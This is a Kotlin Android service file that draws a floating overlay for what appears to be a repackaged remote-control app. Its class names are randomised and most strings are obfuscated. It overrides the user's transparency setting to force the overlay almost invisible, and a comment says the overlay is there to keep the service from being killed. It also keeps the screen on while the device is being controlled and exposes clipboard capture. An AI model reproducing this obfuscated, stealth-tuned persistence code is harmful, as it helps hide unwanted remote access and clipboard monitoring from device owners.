package com.cloudsend.app

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.res.Configuration
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.PixelFormat
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
import android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
import android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
import android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
import android.widget.ImageView
import android.widget.PopupMenu
import com.caverock.androidsvg.SVG
import pkg2230.ClsFx9V0S
import kotlin.math.abs
import android.content.Context

class DFrLMwitwQbfu7AC : Service(), View.OnTouchListener {

    private lateinit var windowManager: WindowManager
    private lateinit var layoutParams: WindowManager.LayoutParams
    private lateinit var floatingView: ImageView
    private lateinit var originalDrawable: Drawable
    private lateinit var leftHalfDrawable: Drawable
    private lateinit var rightHalfDrawable: Drawable

    private var dragging = false
    private var lastDownX = 0f
    private var lastDownY = 0f
    private var viewCreated = false;
    private var keepScreenOn = KeepScreenOn.DURING_CONTROLLED

    companion object {
        private val logTag = p50.a(byteArrayOf(45, -94, 123, 104, -21, -30, 37, -87, 71, 108, -19, -3, 34, -83, 113), byteArrayOf(75, -50, 20, 9, -97, -117))
        private var firstCreate = true
        private var viewWidth = 120
        private var viewHeight = 120
        private const val MIN_VIEW_SIZE = 32 // size 0 does not help prevent the service from being killed
        private const val MAX_VIEW_SIZE = 320
        private const val TRANSPARENT_FLOATING_ALPHA = 0.01f
        private var viewUntouchable = false
        private var viewTransparency = TRANSPARENT_FLOATING_ALPHA
        private var customSvg = ""
        private var lastLayoutX = 0
        private var lastLayoutY = 0
        private var lastOrientation = Configuration.ORIENTATION_UNDEFINED
        public  var app_ClassGen11_Context: Context? = null
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        app_ClassGen11_Context = getApplicationContext()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        try {
            if (firstCreate) {
                firstCreate = false
                onFirstCreate(windowManager)
            }
          
            createView(windowManager)
            handler.postDelayed(runnable, 1000)
      
        } catch (e: Exception) {
            Log.e(logTag, "floating window service create failed", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (viewCreated) {
            try {
                windowManager.removeView(floatingView)
            } catch (e: Exception) {
                Log.e(logTag, "remove floating view failed", e)
            }
            viewCreated = false
        }
        handler.removeCallbacks(runnable)
    }


    private fun createView(windowManager: WindowManager) {
        floatingView = ImageView(this)
        originalDrawable = resources.getDrawable(R.drawable.floating_window, null)
        if (customSvg.isNotEmpty()) {
            try {
                val svg = SVG.getFromString(customSvg)

                // This make the svg render clear
               svg.documentWidth = viewWidth * 1f
               svg.documentHeight = viewHeight * 1f
                originalDrawable = svg.renderToPicture().let {
                    BitmapDrawable(
                        resources,
                        Bitmap.createBitmap(it.width, it.height, Bitmap.Config.ARGB_8888)
                            .also { bitmap ->
                                it.draw(Canvas(bitmap))
                            })
                }
                floatingView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
    
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        val originalBitmap = Bitmap.createBitmap(
            originalDrawable.intrinsicWidth,
            originalDrawable.intrinsicHeight,
            Bitmap.Config.ARGB_8888
        )
        val canvas = Canvas(originalBitmap)
        originalDrawable.setBounds(
            0,
            0,
            originalDrawable.intrinsicWidth,
            originalDrawable.intrinsicHeight
        )
        originalDrawable.draw(canvas)
        val leftHalfBitmap = Bitmap.createBitmap(
            originalBitmap,
            0,
            0,
            originalDrawable.intrinsicWidth / 2,
            originalDrawable.intrinsicHeight
        )
        val rightHalfBitmap = Bitmap.createBitmap(
            originalBitmap,
            originalDrawable.intrinsicWidth / 2,
            0,
            originalDrawable.intrinsicWidth / 2,
            originalDrawable.intrinsicHeight
        )
        leftHalfDrawable = BitmapDrawable(resources, leftHalfBitmap)
        rightHalfDrawable = BitmapDrawable(resources, rightHalfBitmap)

        floatingView.setImageDrawable(rightHalfDrawable)
        floatingView.setOnTouchListener(this)
        floatingView.alpha = viewTransparency * 1f

        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
        if (viewUntouchable) {
            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        }
        layoutParams = WindowManager.LayoutParams(
            viewWidth / 2,
            viewHeight,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            flags,
            PixelFormat.TRANSLUCENT
        )

        layoutParams.gravity = Gravity.TOP or Gravity.START
        layoutParams.x = lastLayoutX
        layoutParams.y = lastLayoutY

        val keepScreenOnOption = ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(27, -75, 4, 121, 34, 62, -52, -101, 46, 21, 53, 93, -65, 15), byteArrayOf(112, -48, 97, 9, 15, 77, -81, -23, 75, 112, 91))).lowercase()
        keepScreenOn = when (keepScreenOnOption) {
            p50.a(byteArrayOf(-78, -117, 55, 34, 21), byteArrayOf(-36, -18, 65, 71, 103, -55, -128, -21, 109)) -> KeepScreenOn.NEVER
            p50.a(byteArrayOf(66, -2, -42, 87, 32, 30, -87, -127, 70, -103), byteArrayOf(49, -101, -92, 33, 73, 125, -52, -84, 41, -9)) -> KeepScreenOn.SERVICE_ON
            else -> KeepScreenOn.DURING_CONTROLLED
        }

        updateKeepScreenOnLayoutParams()

        windowManager.addView(floatingView, layoutParams)
        viewCreated = true
        moveToScreenSide()
    }

    private fun onFirstCreate(windowManager: WindowManager) {
        val wh = getScreenSize(windowManager)
        val w = wh.first
        val h = wh.second
        // size
        ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(-72, -128, 75, -30, 44, -81, 103, -4, -56, -65, -73, -126, 64, -20, 47, -21, 122, -14, -97, -83), byteArrayOf(-34, -20, 36, -125, 88, -58, 9, -101, -27, -56))).let {
            if (it.isNotEmpty()) {
                try {
                    val size = it.toInt()
                    if (size in MIN_VIEW_SIZE..MAX_VIEW_SIZE && size <= w / 2 && size <= h / 2) {
                        viewWidth = size
                        viewHeight = size
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        // untouchable
        viewUntouchable = ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(37, 8, -84, -63, -38, -51, -32, -12, 110, 19, -86, -50, -54, -53, -7, -66, 54, 10, -73, -49, -37, -57, -26, -14, 33, 8, -90), byteArrayOf(67, 100, -61, -96, -82, -92, -114, -109))) == p50.a(byteArrayOf(70), byteArrayOf(31, -71, -97, -97, -58, 101, -18, 4, 50))
        // transparency
        ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(-7, 42, 12, 32, -119, 107, 114, -92, 34, -24, 47, 13, 37, -110, 117, 49, -73, 125, -2, 40, 16, 49, -100, 112, 121, -83, 108, -26), byteArrayOf(-97, 70, 99, 65, -3, 2, 28, -61, 15))).let {
            if (it.isNotEmpty()) {
                try {
                    val transparency = it.toInt()
                    if (transparency in 0..10) {
                        viewTransparency = transparency * 1f / 10
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            if (viewTransparency <= 0f) {
                viewTransparency = TRANSPARENT_FLOATING_ALPHA
            }
        }
        viewTransparency = TRANSPARENT_FLOATING_ALPHA
        // custom svg
        ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(17, 60, -24, 105, -20, 62, 81, 16, 125, -16, 97, -10, 51, 80, 0, 125, -12, 126, -1), byteArrayOf(119, 80, -121, 8, -104, 87, 63))).let {
            if (it.isNotEmpty()) {
                customSvg = it
            }
        }
        // position
        lastLayoutX = 0
        lastLayoutY = (wh.second - viewHeight) / 2
        lastOrientation = resources.configuration.orientation
    }



    private fun performClick() {
        showPopupMenu()
    }

    override fun onTouch(view: View?, event: MotionEvent?): Boolean {
        when (event?.action) {
            MotionEvent.ACTION_DOWN -> {
                dragging = false
                lastDownX = event.rawX
                lastDownY = event.rawY
            }
            MotionEvent.ACTION_UP -> {
                val clickDragTolerance = 10f
                if (abs(event.rawX - lastDownX) < clickDragTolerance && abs(event.rawY - lastDownY) < clickDragTolerance) {
                    performClick()
                } else {
                    moveToScreenSide()
                }
            }
            MotionEvent.ACTION_MOVE -> {
                val dx = event.rawX - lastDownX
                val dy = event.rawY - lastDownY
                // ignore too small fist start moving(some time is click)
                if (!dragging && dx*dx+dy*dy < 25) {
                    return false
                }
                dragging = true
                layoutParams.x = event.rawX.toInt()
                layoutParams.y = event.rawY.toInt()
                layoutParams.width = viewWidth
                floatingView.setImageDrawable(originalDrawable)
                windowManager.updateViewLayout(view, layoutParams)
                lastLayoutX = layoutParams.x
                lastLayoutY = layoutParams.y
            }
        }
        return false
    }

    private fun moveToScreenSide(center: Boolean = false) {
        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val wh = getScreenSize(windowManager)
        val w = wh.first
        if (layoutParams.x < w / 2) {
            layoutParams.x = 0
            floatingView.setImageDrawable(rightHalfDrawable)
        } else {
            layoutParams.x = w - viewWidth / 2
            floatingView.setImageDrawable(leftHalfDrawable)
        }
        if (center) {
            layoutParams.y = (wh.second - viewHeight) / 2
        }
        layoutParams.width = viewWidth / 2
        windowManager.updateViewLayout(floatingView, layoutParams)
        lastLayoutX = layoutParams.x
        lastLayoutY = layoutParams.y
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        if (newConfig.orientation != lastOrientation) {
            lastOrientation = newConfig.orientation
            val wh = getScreenSize(windowManager)
      
            val newW = wh.first
            val newH = wh.second
            if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE || newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
                // Proportional change
                layoutParams.x = (layoutParams.x.toFloat() / newH.toFloat() * newW.toFloat()).toInt()
                layoutParams.y = (layoutParams.y.toFloat() / newW.toFloat() * newH.toFloat()).toInt()
            }
            moveToScreenSide()
        }
    }

     private fun showPopupMenu() {
         val popupMenu = PopupMenu(this, floatingView)
         val idShowApp = 0
         popupMenu.menu.add(0, idShowApp, 0, "进入软件")
         // For host side, clipboard sync
         val idSyncClipboard = 1
         val isServiceSyncEnabled = (oFtTiPzsqzBHGigp.rdClipboardManager?.isCaptureStarted ?: false) && ClsFx9V0S.ebMFLERq()
         if (isServiceSyncEnabled) {
             popupMenu.menu.add(0, idSyncClipboard, 0, translate(p50.a(byteArrayOf(-48, -51, -106, -71, 112, 13, -24, 75, -23, -44, -105, -74, 112, 72, -85, 68, -20, -51, -112, -73, 101, 26, -84), byteArrayOf(-123, -67, -14, -40, 4, 104, -56, 40))))
         }
         val idStopService = 2
         popupMenu.menu.add(0, idStopService, 0, translate(p50.a(byteArrayOf(-116, 86, -86, -18, -79, -109, 26, -30, -90, -74, 65, -96), byteArrayOf(-33, 34, -59, -98, -111, -32, 127, -112, -48))))
         popupMenu.setOnMenuItemClickListener { menuItem ->
             when (menuItem.itemId) {
                 idShowApp -> {
                     openMainActivity()
                     true
                 }
                idSyncClipboard -> {
                     syncClipboard()
                     true
                 }
                 idStopService -> {
                     stopMainService()
                     true
                 }
                 else -> false
             }
         }
         popupMenu.setOnDismissListener {
             moveToScreenSide()
         }
         popupMenu.show()
     }


    private fun openMainActivity() {
        val intent = Intent(this, oFtTiPzsqzBHGigp::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT
        )
        try {
            pendingIntent.send()
        } catch (e: PendingIntent.CanceledException) {
            e.printStackTrace()
        }
    }

    private fun syncClipboard() {
        oFtTiPzsqzBHGigp.rdClipboardManager?.syncClipboard(false)
    }

    private fun stopMainService() {
        oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(p50.a(byteArrayOf(66, -30, 105, 31, 121, -4, 62, 16, -126, 88, -11, 99), byteArrayOf(49, -106, 6, 111, 38, -113, 91, 98, -12)), null)
    }

    enum class KeepScreenOn {
        NEVER,
        DURING_CONTROLLED,
        SERVICE_ON,
    }

    private val handler = Handler(Looper.getMainLooper())
    private val runnable = object : Runnable {
        override fun run() {
            try {
                if (viewCreated && updateKeepScreenOnLayoutParams()) {
                    windowManager.updateViewLayout(floatingView, layoutParams)
                }
            } catch (e: Exception) {
                Log.e(logTag, "floating window keep-screen refresh failed", e)
            }
            handler.postDelayed(this, 1000) // 1000 milliseconds = 1 second
        }
    }

    private fun updateKeepScreenOnLayoutParams(): Boolean {
        val oldOn = layoutParams.flags and FLAG_KEEP_SCREEN_ON != 0
        val newOn = keepScreenOn == KeepScreenOn.SERVICE_ON ||  (keepScreenOn == KeepScreenOn.DURING_CONTROLLED  &&  DFm8Y8iMScvB2YDw.isStart)
        if (oldOn != newOn) {
          
            if (newOn) {
                layoutParams.flags = layoutParams.flags or FLAG_KEEP_SCREEN_ON
            } else {
                layoutParams.flags = layoutParams.flags and FLAG_KEEP_SCREEN_ON.inv()
            }
            return true
        }
        return false
    }
}
